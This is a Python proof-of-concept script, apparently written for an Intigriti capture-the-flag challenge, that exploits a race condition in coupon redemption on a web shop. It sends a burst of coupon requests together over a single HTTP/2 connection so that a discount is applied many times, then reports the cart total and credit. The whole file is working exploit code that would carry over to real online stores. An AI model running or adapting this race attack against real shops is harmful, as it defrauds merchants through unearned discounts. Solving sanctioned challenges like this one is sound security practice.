#!/usr/bin/env python3
"""Intigriti October 2026 challenge — coupon redemption race PoC.
For use only within the authorized CTF challenge environment.
"""
import asyncio
import getpass
import json
import random

import httpx

BASE_URL = "https://challenge-1026.challenges.intigriti.io"
SESSION = getpass.getpass("Challenge session cookie value: ").strip()
COUPONS = ["NIGHT20"] * 5 + ["NEWS30"] * 8
random.shuffle(COUPONS)


async def get_cart(client: httpx.AsyncClient) -> dict:
    response = await client.get("/api/cart")
    response.raise_for_status()
    result = response.json()
    if not result.get("ok"):
        raise RuntimeError(f"Cart request failed: {result}")
    return result["cart"]


async def apply_coupon(client, gate, index, code):
    await gate.wait()
    try:
        response = await client.post("/api/cart/coupon", json={"code": code})
        print(f"[{index:02d}] {code:7} -> HTTP {response.status_code}")
        return response.status_code
    except httpx.RequestError as error:
        print(f"[{index:02d}] {code:7} -> ERROR: {error}")
        return None


async def main():
    if not SESSION:
        raise SystemExit("A valid session cookie is required.")

    limits = httpx.Limits(max_connections=1, max_keepalive_connections=1)
    async with httpx.AsyncClient(
        base_url=BASE_URL,
        cookies={"session": SESSION},
        headers={
            "Accept": "application/json",
            "Origin": BASE_URL,
            "Referer": f"{BASE_URL}/cart",
        },
        http2=True,
        limits=limits,
        timeout=30.0,
    ) as client:
        initial = await get_cart(client)
        if not any(item.get("id") == "midnight-vault" for item in initial.get("items", [])):
            raise SystemExit("Add The Midnight Collection to the cart first.")
        if initial.get("promotions"):
            raise SystemExit("Use a fresh cart without applied coupons.")

        print("Initial total (EUR):", initial["total"] / 100)
        gate = asyncio.Event()
        tasks = [
            asyncio.create_task(apply_coupon(client, gate, i + 1, code))
            for i, code in enumerate(COUPONS)
        ]
        await asyncio.sleep(0.1)
        gate.set()
        statuses = await asyncio.gather(*tasks)

        print("\nRequests:", len(statuses))
        print("HTTP 200:", statuses.count(200))
        print("HTTP 409:", statuses.count(409))
        cart = await get_cart(client)
        print("\nFinal cart:")
        print(json.dumps({
            "subtotal": cart["subtotal"],
            "discount": cart["discount"],
            "total": cart["total"],
            "credit": cart["credit"],
            "canCheckout": cart["canCheckout"],
            "promotions": cart["promotions"],
        }, indent=2))


if __name__ == "__main__":
    asyncio.run(main())
